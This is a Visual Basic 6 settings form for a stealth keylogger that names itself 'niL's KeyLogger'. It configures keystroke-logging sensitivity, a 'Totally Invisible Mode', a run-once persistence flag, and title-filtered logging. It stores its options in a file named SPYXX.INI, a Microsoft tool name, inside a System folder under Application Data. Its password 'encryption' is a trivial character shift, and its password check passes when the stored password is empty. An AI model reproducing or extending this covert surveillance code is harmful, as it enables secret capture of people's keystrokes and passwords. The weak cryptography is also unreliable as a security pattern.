VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmOptions 
   BackColor       =   &H00808080&
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Settings"
   ClientHeight    =   5925
   ClientLeft      =   2565
   ClientTop       =   1500
   ClientWidth     =   5655
   Icon            =   "frmOptions.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5925
   ScaleWidth      =   5655
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  'CenterOwner
   Begin VB.Frame Frame3 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      BorderStyle     =   0  'None
      ForeColor       =   &H80000008&
      Height          =   3135
      Left            =   2880
      TabIndex        =   36
      Top             =   1200
      Visible         =   0   'False
      Width           =   2535
      Begin VB.DirListBox Dir1 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         ForeColor       =   &H00FFFFFF&
         Height          =   2565
         Left            =   120
         TabIndex        =   38
         Top             =   480
         Width           =   2295
      End
      Begin VB.DriveListBox Drive1 
         BackColor       =   &H00000000&
         ForeColor       =   &H00FFFFFF&
         Height          =   315
         Left            =   120
         TabIndex        =   37
         Top             =   120
         Width           =   2295
      End
   End
   Begin VB.TextBox Text3 
      Alignment       =   2  'Center
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   2400
      PasswordChar    =   "*"
      TabIndex        =   35
      TabStop         =   0   'False
      Text            =   "password"
      Top             =   2520
      Visible         =   0   'False
      Width           =   2895
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00000000&
      Height          =   1575
      Left            =   0
      TabIndex        =   30
      Top             =   1800
      Width           =   5655
      Begin VB.TextBox txtPwd 
         BackColor       =   &H00404040&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   13.5
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   2520
         MaxLength       =   25
         PasswordChar    =   "*"
         TabIndex        =   0
         Top             =   600
         Width           =   2535
      End
      Begin VB.Label lblNote 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Setting will be applied after Restart."
         ForeColor       =   &H00808080&
         Height          =   255
         Left            =   360
         TabIndex        =   39
         Top             =   1200
         Width           =   5055
      End
      Begin VB.Label Label7 
         BackStyle       =   0  'Transparent
         Caption         =   "Enter Password :"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   12
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00E0E0E0&
         Height          =   375
         Left            =   360
         TabIndex        =   31
         Top             =   600
         Width           =   2055
      End
   End
   Begin VB.TextBox txtNPwd 
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   270
      IMEMode         =   3  'DISABLE
      Left            =   2400
      MaxLength       =   25
      PasswordChar    =   "*"
      TabIndex        =   7
      Top             =   2520
      Width           =   2895
   End
   Begin VB.TextBox Username 
      Height          =   285
      Left            =   240
      TabIndex        =   28
      Text            =   "Text1"
      Top             =   5400
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.Frame fraSample1 
      BackColor       =   &H00808080&
      Caption         =   "Logging Mode"
      Enabled         =   0   'False
      ForeColor       =   &H00FFFFFF&
      Height          =   2115
      Left            =   120
      TabIndex        =   25
      Top             =   3120
      Width           =   5415
      Begin VB.OptionButton Option2 
         BackColor       =   &H00808080&
         Caption         =   "Everyday New Logfile"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   240
         TabIndex        =   9
         Top             =   480
         Width           =   3855
      End
      Begin VB.OptionButton Option3 
         BackColor       =   &H00808080&
         Caption         =   "Only One Logfile."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   240
         TabIndex        =   10
         Top             =   720
         Width           =   4695
      End
      Begin VB.OptionButton Option1 
         BackColor       =   &H00808080&
         Caption         =   "New Logfile on each LogOn. (Recommended)"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   240
         TabIndex        =   8
         Top             =   240
         Width           =   4815
      End
      Begin VB.TextBox txtLogDir 
         Alignment       =   2  'Center
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   2280
         TabIndex        =   11
         Top             =   1200
         Width           =   3015
      End
      Begin VB.TextBox Text2 
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   0  'None
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   2280
         MaxLength       =   5
         TabIndex        =   12
         Top             =   1560
         Width           =   3015
      End
      Begin VB.Label Label5 
         BackStyle       =   0  'Transparent
         Caption         =   "Changing this will create new Logfile with this settings."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C0C0&
         Height          =   255
         Left            =   960
         TabIndex        =   32
         Top             =   1920
         Width           =   3735
      End
      Begin VB.Label Label3 
         BackStyle       =   0  'Transparent
         Caption         =   "Log Directory Path :"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   240
         TabIndex        =   27
         Top             =   1200
         Width           =   1935
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Logfile extension :"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   240
         TabIndex        =   26
         Top             =   1560
         Width           =   2055
      End
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00808080&
      Caption         =   "Logging Setting"
      Enabled         =   0   'False
      ForeColor       =   &H00FFFFFF&
      Height          =   2895
      Left            =   120
      TabIndex        =   22
      Top             =   120
      Width           =   5415
      Begin VB.CheckBox Check3 
         BackColor       =   &H00808080&
         Caption         =   "Record Log under certain titles only."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   1560
         Width           =   4575
      End
      Begin VB.CheckBox Check4 
         BackColor       =   &H00808080&
         Caption         =   "Totally Invisible Mode."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   4
         Top             =   1200
         Width           =   5055
      End
      Begin VB.CheckBox Check1 
         BackColor       =   &H00808080&
         Caption         =   "Print child window title."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   2
         Top             =   600
         Width           =   5055
      End
      Begin VB.CheckBox Check2 
         BackColor       =   &H00808080&
         Caption         =   "Remove last character on Backspace."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   120
         TabIndex        =   3
         Top             =   840
         Width           =   5055
      End
      Begin MSComctlLib.Slider Slider2 
         Height          =   255
         Left            =   2040
         TabIndex        =   1
         Top             =   240
         Width           =   3255
         _ExtentX        =   5741
         _ExtentY        =   450
         _Version        =   393216
         OLEDropMode     =   1
         Max             =   100
         SelStart        =   60
         Value           =   60
      End
      Begin MSComctlLib.Slider Slider1 
         Height          =   255
         Left            =   2280
         TabIndex        =   6
         Top             =   1920
         Width           =   2895
         _ExtentX        =   5106
         _ExtentY        =   450
         _Version        =   393216
         LargeChange     =   2
         Min             =   -10
         Max             =   30
      End
      Begin VB.Label Label9 
         BackStyle       =   0  'Transparent
         Caption         =   "Next Sessions in current log will be unrecoverable."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C0C0&
         Height          =   255
         Left            =   2160
         TabIndex        =   34
         Top             =   2160
         Visible         =   0   'False
         Width           =   3735
      End
      Begin VB.Label Label8 
         BackStyle       =   0  'Transparent
         Caption         =   "New password will be applied to next logfile generated."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C0C0&
         Height          =   375
         Left            =   1800
         TabIndex        =   33
         Top             =   2640
         Visible         =   0   'False
         Width           =   3735
      End
      Begin VB.Label Label6 
         BackStyle       =   0  'Transparent
         Caption         =   "New Password :"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   240
         TabIndex        =   29
         Top             =   2400
         Width           =   1695
      End
      Begin VB.Label Label2 
         BackStyle       =   0  'Transparent
         Caption         =   "KeyLogger Sensitivity:"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   120
         TabIndex        =   24
         Top             =   240
         Width           =   2535
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Encryption strength :"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   23
         Top             =   1920
         Width           =   2415
      End
   End
   Begin VB.PictureBox picOptions 
      BorderStyle     =   0  'None
      Height          =   3780
      Index           =   3
      Left            =   -20000
      ScaleHeight     =   3780
      ScaleWidth      =   5685
      TabIndex        =   18
      TabStop         =   0   'False
      Top             =   480
      Width           =   5685
      Begin VB.Frame fraSample4 
         Caption         =   "Sample 4"
         Height          =   1785
         Left            =   2100
         TabIndex        =   21
         Top             =   840
         Width           =   2055
      End
   End
   Begin VB.PictureBox picOptions 
      BorderStyle     =   0  'None
      Height          =   3780
      Index           =   2
      Left            =   -20000
      ScaleHeight     =   3780
      ScaleWidth      =   5685
      TabIndex        =   17
      TabStop         =   0   'False
      Top             =   480
      Width           =   5685
      Begin VB.Frame fraSample3 
         Caption         =   "Sample 3"
         Height          =   1785
         Left            =   1545
         TabIndex        =   20
         Top             =   675
         Width           =   2055
      End
   End
   Begin VB.PictureBox picOptions 
      BorderStyle     =   0  'None
      Height          =   3780
      Index           =   1
      Left            =   -20000
      ScaleHeight     =   3780
      ScaleWidth      =   5685
      TabIndex        =   16
      TabStop         =   0   'False
      Top             =   480
      Width           =   5685
      Begin VB.Frame fraSample2 
         Caption         =   "Sample 2"
         Height          =   1785
         Left            =   645
         TabIndex        =   19
         Top             =   300
         Width           =   2055
      End
   End
   Begin VB.CommandButton cmdApply 
      Caption         =   "Apply"
      Enabled         =   0   'False
      Height          =   375
      Left            =   4320
      TabIndex        =   15
      Top             =   5415
      Width           =   1095
   End
   Begin VB.CommandButton cmdCancel 
      Cancel          =   -1  'True
      Caption         =   "Cancel"
      Height          =   375
      Left            =   3120
      TabIndex        =   14
      Top             =   5415
      Width           =   1095
   End
   Begin VB.CommandButton cmdOK 
      Caption         =   "&OK"
      Enabled         =   0   'False
      Height          =   375
      Left            =   1890
      TabIndex        =   13
      Top             =   5415
      Width           =   1095
   End
End
Attribute VB_Name = "frmOptions"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'username import function
Private Declare Function getusername Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long


Dim pwdcorrect As Boolean

Private Sub Check3_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Check3.Value = vbChecked Then
'frmTitles.Show
Call frmMain.LoadTitles
frmMain.fraTitles.Visible = True
End If
End Sub

Private Sub Dir1_Change()
txtLogDir.Text = Dir1.Path
End Sub

Private Sub Drive1_Change()
On Error GoTo err
Dir1.Path = Drive1.Drive
err:
If err.Number <> 0 Then Frame3.Visible = False: Call loadsettings
End Sub



Private Sub Form_Load()
Call GetUname
    'center the form
    Me.Move (Screen.Width - Me.Width) / 2, (Screen.Height - Me.Height) / 2


If Dir("C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI") <> "" Then
    txtPwd = frmMain.upwd.Text 'Use main forms password here
    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    txtLogDir.Visible = False
    Call txtPwd_Change
Else
    MsgBox "niL's KeyLogger have not been configured !", vbCritical
    Exit Sub
End If
End Sub

Public Sub loadsettings()

    txtLogDir.Visible = True
    Check2.Value = INIRead("LogSetting", "USEBS", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    Check1.Value = INIRead("LogSetting", "UseChildTitle", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    Slider1.Value = INIRead("LogSetting", "EncCode", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    Text2.Text = INIRead("LogSetting", "extension", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    Slider2.Value = INIRead("LogSetting", "TimerInt", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    txtLogDir.Text = INIRead("LogSetting", "LogDir", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    txtNPwd.Text = INIRead("LogSetting", "Pwd", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    Check4.Value = INIRead("LogSetting", "SETRUNONCE", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    Check3.Value = INIRead("LogSetting", "sLogging", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")


    Dim logmode As Integer
    logmode = INIRead("LogSetting", "LogMode", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    Select Case logmode
    Case 0
    Option1.Value = True
    Case 1
    Option2.Value = True
    Case 2
    Option3.Value = True
    End Select

End Sub

Private Sub cmdApply_Click()
On Error GoTo err
Dir1.Path = txtLogDir.Text

If Right(txtLogDir.Text, 1) = "\" Then txtLogDir.Text = Mid(txtLogDir.Text, 1, Len(txtLogDir) - 1)

IniWrite "LogSetting", "USEBS", Check2.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "UseChildTitle", Check1.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "EncCode", Slider1.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "extension", Text2.Text, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "TimerInt", Slider2.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "LogDir", txtLogDir.Text, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "Pwd", encrypt(txtNPwd.Text, 10), "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "SETRUNONCE", Check4.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
IniWrite "LogSetting", "sLogging", Check3.Value, "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"

If Option1.Value = True Then
IniWrite "LogSetting", "LogMode", "0", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
ElseIf Option2.Value = True Then
IniWrite "LogSetting", "LogMode", "1", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
ElseIf Option3.Value = True Then
IniWrite "LogSetting", "LogMode", "2", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI"
End If


err:
If err.Number = 76 Then MsgBox "Path not Available! Settings not saved.", vbCritical: Call loadsettings
End Sub
Private Function encrypt(givenText As String, eCode As Integer)
Dim i As Integer
For i = 1 To Len(givenText)
If Asc(Mid(givenText, i, 1)) <> 13 Then encrypt = encrypt & Chr(Asc(Mid(givenText, i, 1)) + eCode)
Next i
End Function

Private Sub cmdCancel_Click()
    Unload Me
End Sub

Private Sub cmdOK_Click()
Call cmdApply_Click
Unload Me
End Sub



Private Sub Frame1_Click()
Frame3.Visible = False
End Sub



Private Sub fraSample1_Click()
Frame3.Visible = False
End Sub


Private Sub Slider1_Click()
Label9.Visible = True
End Sub

Private Sub Slider2_Change()
If Slider2.Value < 10 Then MsgBox "Very Low.": Slider2.Value = 10
End Sub

Private Sub txtLogDir_Change()
On Error Resume Next
Dir1.Path = txtLogDir.Text
Drive1.Drive = txtLogDir.Text
End Sub


Private Sub txtLogDir_Click()

If Frame3.Visible = True Then
Frame3.Visible = False
Else
Frame3.Visible = True
End If
End Sub

Private Sub Text3_Click()
Text3.Visible = False
txtNPwd.Text = ""
txtNPwd.SetFocus

End Sub

Private Sub txtNPwd_Change()
Label8.Visible = True
End Sub

Private Sub txtPwd_Change()

If Dir("C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI") <> "" Then
    Dim pwd As String
    pwd = INIRead("LogSetting", "Pwd", "C:\Documents and Settings\" & Username & "\Application Data\System\SPYXX.INI")
    If encrypt(Left(pwd, Len(pwd) - 1), -10) = txtPwd.Text Or encrypt(Left(pwd, Len(pwd) - 1), -10) = "" Then

        Call loadsettings
        cmdApply.Enabled = True
        cmdOK.Enabled = True
        fraSample1.Enabled = True
        Frame1.Enabled = True
        Frame2.Visible = False
        Text3.Visible = True
    End If
Else
 Unload Me
End If
End Sub
Private Sub GetUname()

'get username
Dim sBuffer As String
    Dim lSize As Long
    sBuffer = Space$(255)
    lSize = Len(sBuffer)
    Call getusername(sBuffer, lSize)
If lSize > 0 Then
        Username = Left$(sBuffer, lSize)
Else
        Username = vbNullString
End If
End Sub
